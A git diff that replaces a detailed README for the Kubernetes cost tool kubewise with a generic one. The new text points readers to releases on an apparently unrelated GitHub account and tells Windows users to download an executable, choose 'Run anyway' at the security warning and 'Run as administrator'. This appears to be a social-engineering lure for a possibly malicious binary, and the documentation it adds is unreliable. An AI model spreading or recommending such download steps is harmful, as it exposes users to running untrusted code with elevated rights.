@@ -1,440 +1,221 @@
-<h2 align="center">
-  <picture>
-    <source media="(prefers-color-scheme: dark)" srcset="assets/logo-dark.png">
-    <source media="(prefers-color-scheme: light)" srcset="assets/logo.png">
-    <img alt="KubeWise" src="assets/logo.png" width="420">
-  </picture>
-</h2>
+# 📦 kubewise - Model Kubernetes costs before changes
 
-<p align="center">
-  <strong>Kubernetes cost and performance "what-if" simulator.</strong><br>
-  Snapshot your cluster, simulate changes, and see the cost impact before making them.
-</p>
+[![Download kubewise](https://img.shields.io/badge/Download%20kubewise-blue?style=for-the-badge&logo=github)](https://github.com/reveryfilingcabinet968/kubewise/releases)
 
-<p align="center">
-  <a href="https://github.com/tochemey/kubewise/actions/workflows/ci.yml"><img alt="CI" src="https://img.shields.io/github/actions/workflow/status/tochemey/kubewise/ci.yml?style=flat-square" ></a>
-  <a href="LICENSE"><img src="https://img.shields.io/badge/license-Apache%202.0-blue?style=flat-square" alt="License"></a>
-  <a href="https://goreportcard.com/report/github.com/tochemey/kubewise"><img src="https://goreportcard.com/badge/github.com/tochemey/kubewise" alt="Go Report Card"></a>
-</p>
+## 🧭 What kubewise does
 
----
+kubewise helps you see the cost impact of planned Kubernetes changes before you make them. It takes a snapshot of your cluster, then shows how changes may affect cost and risk.
 
-## 😵 The Problem
+Use it to compare plans like:
 
-Kubernetes billing is a black box. Teams overprovision because the cost of an outage outweighs the cost of waste — and nobody has time to model the tradeoffs. Cloud cost tools tell you *what you're spending*, but they don't answer **"what would happen if I changed X?"** You're flying blind every time you touch resource requests, node pools, or scheduling policies.
+- right-sizing workloads
+- moving pods to spot instances
+- consolidating nodes
+- testing cost changes before rollout
 
-## 💡 The Solution
+It works as a kubectl plugin through krew, so it fits into a common Kubernetes workflow.
 
-KubeWise is a Kubernetes cost × performance "what-if" simulator. It snapshots your live cluster, lets you define hypothetical changes, simulates the Kubernetes scheduler against the modified state, and reports cost savings alongside reliability risk — all without touching your cluster.
+## 💻 What you need
 
-**The core loop: snapshot → mutate → simulate → compare.**
+Before you install kubewise, make sure you have:
 
-1. **📸 Snapshot the cluster.** Read everything that matters: pod resource usage, node capacities, autoscaler configs, PDB rules, affinity constraints, and current cloud pricing. This becomes the baseline with a real dollar cost attached.
+- a Windows computer
+- internet access
+- permission to download files from GitHub
+- kubectl installed
+- krew installed if you want to use the kubectl plugin flow
+- access to a Kubernetes cluster if you plan to snapshot live data
 
-2. **✏️ Define a scenario.** Describe a hypothetical change:
-   - *"Right-size every pod's requests to p95 actual usage + 20% buffer"*
-   - *"Move all stateless services to spot instances"*
-   - *"Consolidate from 3 node pools to 2 using larger instance types"*
-   - *"What if traffic doubles next month?"*
+If you only want to open the app and explore local snapshots, you still need a Windows system and the release file from GitHub.
 
-3. **⚙️ Simulate.** Replay the Kubernetes scheduler's bin-packing algorithm against the modified scenario. Run autoscaler logic. Check affinity rules, PDBs, topology constraints. Model spot interruption probability.
+## 📥 Download kubewise
 
-4. **📊 Compare and score.** Side-by-side: baseline vs. scenario. Cost delta, reliability delta, and confidence intervals. Not a single number — a distribution.
+Visit this page to download:
 
-## 🎯 Differentiator
+https://github.com/reveryfilingcabinet968/kubewise/releases
 
-Existing tools either show you the past (Kubecost) or act on the future without you (CAST AI). Nobody lets you **explore the future yourself**. KubeWise sits in the gap — **high insight AND high user agency**.
+On that page:
 
-|                            | Observability tools | Autopilots | **KubeWise** |
-|----------------------------|---------------------|------------|--------------|
-| Shows cost data            | ✅                   | ✅          | ✅            |
-| Recommends changes         | ❌                   | ✅          | ✅            |
-| Simulates before acting    | ❌                   | ❌          | ✅            |
-| User controls the decision | ✅                   | ❌          | ✅            |
-| Runs client-side (no SaaS) | ❌                   | ❌          | ✅            |
+1. open the latest release
+2. find the Windows file
+3. download the file to your computer
+4. save it in a folder you can find again, such as Downloads
 
-## ✨ Features
+If the release contains a zip file, extract it first before you run the app.
 
-- **📉 Right-size workloads** based on actual P50/P90/P95/P99 usage with configurable safety buffers
-- **🔗 Simulate node consolidation** to find the minimum number of nodes needed
-- **💰 Estimate spot savings** with eviction risk assessment per workload
-- **🤖 CI/CD integration** via GitHub Action that posts cost impact as PR comments
-- **🔒 Runs entirely client-side** — no SaaS dependency, your cluster data never leaves your machine
+## 🛠️ Install on Windows
 
-## 🚀 Quick Start
+After the file finishes downloading:
 
-### Install
+1. open File Explorer
+2. go to the folder with the download
+3. if the file is zipped, right-click it and choose Extract All
+4. open the extracted folder
+5. look for the kubewise file or installer
+6. double-click the file to run it
 
-```bash
-# Homebrew (macOS / Linux)
-brew install tochemey/tap/kubewise
+If Windows shows a security prompt:
 
-# Scoop (Windows)
-scoop bucket add kubewise https://github.com/tochemey/scoop-bucket.git
-scoop install kubewise
+1. choose More info
+2. choose Run anyway if you trust the source
+3. wait for the app to open
 
-# krew (kubectl plugin)
-kubectl krew install whatif
+If the release includes a command-line file, keep it in a folder you can reach from Command Prompt or PowerShell.
 
-# Go install
-go install github.com/tochemey/kubewise/cmd/kubectl-whatif@latest
-```
+## ⚙️ Use with krew
 
-Pre-built binaries for macOS, Linux, and Windows are available on the [Releases](https://github.com/tochemey/kubewise/releases) page.
+kubewise also works as a kubectl plugin through krew.
 
-**From source:**
+If you already use krew:
 
-```bash
-git clone https://github.com/tochemey/kubewise.git
-cd kubewise
-make install
-```
+1. open PowerShell
+2. make sure kubectl works on your machine
+3. install the kubewise plugin from the krew index, if the release provides that path
+4. run it from kubectl like other plugins
 
-### Global Flags
+A common plugin flow looks like this:
 
-These flags apply to all commands:
+1. open a terminal
+2. run a kubectl command
+3. use the kubewise command from the plugin name
+4. connect it to your cluster snapshot or plan file
 
-| Flag               | Default          | Description                                |
-|--------------------|------------------|--------------------------------------------|
-| `--kubeconfig`     | `~/.kube/config` | Path to kubeconfig file                    |
-| `--context`        | current context  | Kubernetes context to use                  |
-| `--namespace`      | all              | Limit to specific namespace                |
-| `--prometheus-url` | auto-detect      | Prometheus endpoint for historical metrics |
-| `--output`, `-o`   | `table`          | Output format: `table`, `json`, `markdown` |
-| `--verbose`        | `false`          | Show detailed per-workload breakdown       |
-| `--no-color`       | `false`          | Disable terminal colors                    |
+If you do not use krew, you can still use the release download from GitHub.
 
-## 📸 Snapshot — See Current Cost Breakdown
+## 🚀 First run
 
-Snapshot captures the live cluster state and displays the current cost breakdown per namespace using a stacked-panel layout.
+When kubewise opens for the first time, it may ask for:
 
-```bash
-# Basic snapshot
-kubectl whatif snapshot
+- a cluster context
+- a snapshot target
+- a file location for saved plans
+- access to Kubernetes resources
 
-# Save snapshot to file for later use
-kubectl whatif snapshot --save=cluster-snapshot.json
+A simple first run looks like this:
 
-# JSON output for scripting
-kubectl whatif snapshot --output=json
+1. open kubewise
+2. choose your cluster
+3. create a snapshot
+4. review the current cost view
+5. try one change at a time
+6. compare the cost result before and after
 
-# Limit to a single namespace
-kubectl whatif snapshot --namespace=api
-```
+Start with one small change so the results are easy to read.
 
-Example output (each namespace is displayed as a separate panel):
+## 📊 What you can test
 
-```
-KubeWise: Snapshot of current cluster cost breakdown
+kubewise is useful when you want to compare the effect of a change before you apply it.
 
-  Total monthly cost:    $14230
-  Cluster OOM risk:      0.8%  low
-  Overall risk:          low
-  Namespaces:            3
+Common checks include:
 
---------------------------------------------
-  api
+- right-sizing pods that use too much CPU or memory
+- moving workloads from on-demand nodes to spot instances
+- combining small nodes into fewer larger nodes
+- reviewing cost shifts after a planned rollout
+- checking the risk of a change before approval
 
-  Monthly cost:    $1200
-  CPU requested:   4 cores
-  Mem requested:   8 Gi
-  Risk:            low
+It gives you a way to look at both cost and risk in one place.
 
-  Workloads:
-    api-gateway    $800.00     low
-    api-auth       $400.00     low
+## 🧩 How the workflow fits together
 
---------------------------------------------
-  data-pipeline
+A simple kubewise workflow is:
 
-  Monthly cost:    $980
-  CPU requested:   2.5 cores
-  Mem requested:   12 Gi
-  Risk:            moderate
+1. snapshot your cluster
+2. model a change
+3. compare the expected cost
+4. review the risk impact
+5. apply the change if the result looks good
 
-  Workloads:
-    etl            $980.00     moderate
+This helps you avoid trial and error in the live cluster.
 
---------------------------------------------
-  default
+## 🗂️ Example use cases
 
-  Monthly cost:    $640
-  CPU requested:   1 cores
-  Mem requested:   2 Gi
-  Risk:            low
+Use kubewise when you want to:
 
-  Workloads:
-    web            $640.00     low
-```
+- prepare a cost review for a Kubernetes team
+- check whether spot migration is worth it
+- see if node consolidation lowers spend
+- test a new sizing plan before deployment
+- support finops work with cluster data
+- share a clear view of cost impact with non-technical people
 
-## 📉 Right-Size — Simulate Resource Optimization
+## 🔍 Tips for best results
 
-Right-sizes pod resource requests based on actual usage percentiles with a configurable safety buffer.
+- use a fresh snapshot
+- compare one change at a time
+- keep cluster names and node groups clear
+- review both cost and risk, not cost alone
+- save your plan files so you can compare later
+- use the same context each time when possible
 
-```bash
-# Default: p95 percentile + 20% buffer
-kubectl whatif rightsize
+## 🧪 Common problems
 
-# Conservative: p99 percentile + 30% buffer
-kubectl whatif rightsize --percentile=p99 --buffer=30
+If kubewise does not open:
 
-# Aggressive: p90 percentile + 10% buffer
-kubectl whatif rightsize --percentile=p90 --buffer=10
+1. check that the download finished
+2. make sure you extracted the zip file
+3. right-click the file and try Run as administrator
+4. confirm Windows did not block the file
 
-# Scope to specific namespaces
-kubectl whatif rightsize --scope-namespaces=api,data-pipeline
+If kubectl or krew does not work:
 
-# Exclude system namespaces
-kubectl whatif rightsize --exclude-namespaces=kube-system,monitoring
+1. open PowerShell
+2. type `kubectl version`
+3. confirm kubectl is installed
+4. confirm your cluster context is set
+5. check that krew is on your PATH if you use the plugin flow
 
-# Show per-workload details
-kubectl whatif rightsize --verbose
-```
+If the app cannot read cluster data:
 
-| Flag                   | Default | Description                                   |
-|------------------------|---------|-----------------------------------------------|
-| `--percentile`         | `p95`   | Usage percentile: `p50`, `p90`, `p95`, `p99`  |
-| `--buffer`             | `20`    | Buffer percentage above the percentile        |
-| `--scope-namespaces`   | all     | Comma-separated namespaces to include         |
-| `--exclude-namespaces` | none    | Comma-separated namespaces to exclude         |
-| `--limit-strategy`     | none    | How to set limits: `ratio`, `fixed`, or empty |
+1. confirm you are signed in to the right cluster
+2. check your access rights
+3. try again with a different context
+4. use a snapshot created from a cluster you can reach
 
-Example output:
+## 📁 File names you may see
 
-```
-KubeWise: Right-size simulation (p95 + 20% buffer)
+The release page may include files such as:
 
-  Current monthly cost:    $14230
-  Projected monthly cost:  $9840
-  Savings:                 $4390/mo (30.8%)  low
-  Cluster OOM risk:        0.8%              low
+- a Windows zip package
+- a Windows executable
+- a plugin package for krew
+- release notes
+- checksum files
 
-  Top savings by namespace:
-    api-gateway          $1200/mo saved    risk: low
-    data-pipeline        $980/mo saved     risk: moderate
-    ml-inference         $870/mo saved     risk: high
-    web-frontend         $640/mo saved     risk: low
-    auth-service         $700/mo saved     risk: low
-```
+Choose the Windows file that matches the way you want to use kubewise.
 
-## 🔗 Consolidate — Simulate Node Pool Consolidation
+## 🔐 Safety and access
 
-Simulates consolidating workloads onto fewer or different node types using bin-packing.
+kubewise works with cluster data, so it may need read access to Kubernetes resources. Use an account that can view the parts of the cluster you want to model. Keep the download from the official GitHub release page so you know where the file came from.
 
-```bash
-# Consolidate to a specific instance type
-kubectl whatif consolidate --node-type=m6i.xlarge
+## 🖥️ Windows setup path
 
-# Cap the number of nodes
-kubectl whatif consolidate --node-type=m6i.2xlarge --max-nodes=10
+If you want the simplest path on Windows:
 
-# Keep an existing node pool
-kubectl whatif consolidate --node-type=m6i.xlarge --keep-pool=critical-pool
-```
+1. go to the release page
+2. download the Windows file
+3. extract it if needed
+4. open the app
+5. create a snapshot
+6. review the cost plan
+7. keep the file in a known folder for later use
 
-| Flag              | Default   | Description                             |
-|-------------------|-----------|-----------------------------------------|
-| `--node-type`     | required  | Target instance type for consolidation  |
-| `--max-nodes`     | unlimited | Maximum number of nodes in the new pool |
-| `--keep-pool`     | none      | Existing node pool to preserve          |
-| `--target-cpu`    | `0.8`     | Target CPU utilization ratio            |
-| `--target-memory` | `0.8`     | Target memory utilization ratio         |
+## 📌 Where to get updates
 
-## 💰 Spot — Simulate Spot Instance Migration
+To get the latest version, check the releases page again:
 
-Estimates savings from migrating eligible workloads to spot instances, with per-workload eviction risk scoring.
+https://github.com/reveryfilingcabinet968/kubewise/releases
 
-```bash
-# Default: workloads with >=2 replicas, 65% discount
-kubectl whatif spot
+Look for newer release notes, newer Windows files, and any changes to the plugin install steps
 
-# More aggressive: include single-replica workloads
-kubectl whatif spot --min-replicas=1
+## 🧭 Typical workflow for a non-technical user
 
-# Custom discount rate
-kubectl whatif spot --discount=0.70
-
-# Exclude specific namespaces
-kubectl whatif spot --exclude-namespaces=kube-system,databases
+If you are new to this tool, use this path:
 
-# With detailed risk breakdown
-kubectl whatif spot --verbose
-```
-
-| Flag                   | Default                 | Description                           |
-|------------------------|-------------------------|---------------------------------------|
-| `--min-replicas`       | `2`                     | Minimum replicas for spot eligibility |
-| `--discount`           | `0.65`                  | Spot discount fraction (0.0 - 1.0)    |
-| `--exclude-namespaces` | none                    | Comma-separated namespaces to exclude |
-| `--controller-types`   | `Deployment,ReplicaSet` | Controller types eligible for spot    |
-
-## 📝 Scenario Files — Define Reusable Scenarios
-
-Define scenarios as YAML files for repeatability and version control:
-
-```yaml
-apiVersion: kubewise.io/v1alpha1
-kind: RightSize
-metadata:
-  name: conservative
-  description: "Conservative right-sizing"
-spec:
-  percentile: p95
-  buffer: 30
-  scope:
-    namespaces: ["*"]
-    exclude:
-      - namespace: kube-system
-  limits:
-    strategy: ratio
-```
-
-```bash
-# Apply a single scenario
-kubectl whatif apply -f scenario.yaml
-
-# Compare multiple scenarios side by side
-kubectl whatif compare -f aggressive.yaml -f conservative.yaml
-```
-
-See [docs/scenarios.md](docs/scenarios.md) for all scenario types and options.
-
-## 📁 Output Formats
-
-All commands support three output formats:
-
-```bash
-kubectl whatif rightsize                    # Terminal table (default)
-kubectl whatif rightsize --output=json      # JSON for scripting
-kubectl whatif rightsize --output=markdown  # Markdown for PR comments
-```
-
-The `snapshot` command uses a stacked-panel layout in table mode, showing each namespace as a bordered panel with cost, resource, and workload details. JSON and markdown outputs include the same data in their respective formats.
-
-## 🤖 CI/CD Integration
-
-### GitHub Action
-
-Add KubeWise to your GitHub workflow to automatically post cost impact analysis on pull requests:
-
-```yaml
-# .github/workflows/cost-check.yml
-name: Cost Check
-on:
-  pull_request:
-
-jobs:
-  cost-check:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v4
-
-      - uses: tochemey/kubewise/action@v1
-        with:
-          kubeconfig: ${{ secrets.KUBECONFIG_B64 }}
-          scenario: rightsize
-          percentile: p95
-          buffer: '20'
-          comment: 'true'
-```
-
-### Action Inputs
-
-| Input           | Required | Default     | Description                                                   |
-|-----------------|----------|-------------|---------------------------------------------------------------|
-| `kubeconfig`    | yes      | —           | Base64-encoded kubeconfig                                     |
-| `scenario`      | yes      | `rightsize` | Scenario type: `rightsize`, `consolidate`, `spot`, `snapshot` |
-| `scenario-file` | no       | —           | Path to scenario YAML (overrides scenario type)               |
-| `percentile`    | no       | `p95`       | Usage percentile (rightsize only)                             |
-| `buffer`        | no       | `20`        | Buffer percentage (rightsize only)                            |
-| `node-type`     | no       | —           | Target instance type (consolidate only, required)             |
-| `min-replicas`  | no       | `2`         | Minimum replicas for spot eligibility (spot only)             |
-| `discount`      | no       | `0.65`      | Spot discount fraction (spot only)                            |
-| `save`          | no       | —           | Save snapshot to JSON file (snapshot only)                    |
-| `comment`       | no       | `true`      | Post result as PR comment                                     |
-| `fail-on-risk`  | no       | `false`     | Fail the check if risk is red                                 |
-
-### Action Outputs
-
-| Output            | Description                                  |
-|-------------------|----------------------------------------------|
-| `savings`         | Projected monthly savings                    |
-| `savings-percent` | Projected savings percentage                 |
-| `risk-level`      | Overall risk level (`green`, `amber`, `red`) |
-| `markdown`        | Full markdown report                         |
-
-### Examples
-
-**Right-size on every PR:**
-
-```yaml
-- uses: tochemey/kubewise/action@v1
-  with:
-    kubeconfig: ${{ secrets.KUBECONFIG_B64 }}
-    scenario: rightsize
-    comment: 'true'
-```
-
-**Spot migration analysis with risk gate:**
-
-```yaml
-- uses: tochemey/kubewise/action@v1
-  with:
-    kubeconfig: ${{ secrets.KUBECONFIG_B64 }}
-    scenario: spot
-    min-replicas: '2'
-    discount: '0.65'
-    fail-on-risk: 'true'
-```
-
-**Cluster cost snapshot:**
-
-```yaml
-- uses: tochemey/kubewise/action@v1
-  with:
-    kubeconfig: ${{ secrets.KUBECONFIG_B64 }}
-    scenario: snapshot
-    comment: 'true'
-```
-
-**Custom scenario file:**
-
-```yaml
-- uses: tochemey/kubewise/action@v1
-  with:
-    kubeconfig: ${{ secrets.KUBECONFIG_B64 }}
-    scenario-file: scenarios/production-rightsize.yaml
-    comment: 'true'
-    fail-on-risk: 'true'
-```
-
-**Use outputs in downstream steps:**
-
-```yaml
-- uses: tochemey/kubewise/action@v1
-  id: kubewise
-  with:
-    kubeconfig: ${{ secrets.KUBECONFIG_B64 }}
-    scenario: rightsize
-
-- run: echo "Projected savings: ${{ steps.kubewise.outputs.savings }}"
-```
-
-## 📚 Documentation
-
-- [Quick Start](docs/quickstart.md)
-- [Scenarios](docs/scenarios.md)
-- [Architecture](docs/architecture.md)
-
-## 🤝 Contributing
-
-```bash
-make lint        # Run linters
-make test-unit   # Run unit tests
-make test-all    # Lint + test
-make build       # Build binary
-```
-
-## 📄 License
-
-Apache License 2.0. See [LICENSE](LICENSE) for details.
+1. download kubewise from the releases page
+2. open the file on Windows
+3. connect it to your cluster or load a snapshot
+4. choose one possible change
+5. review the cost result
+6. review the risk result
+7. save the plan for later review
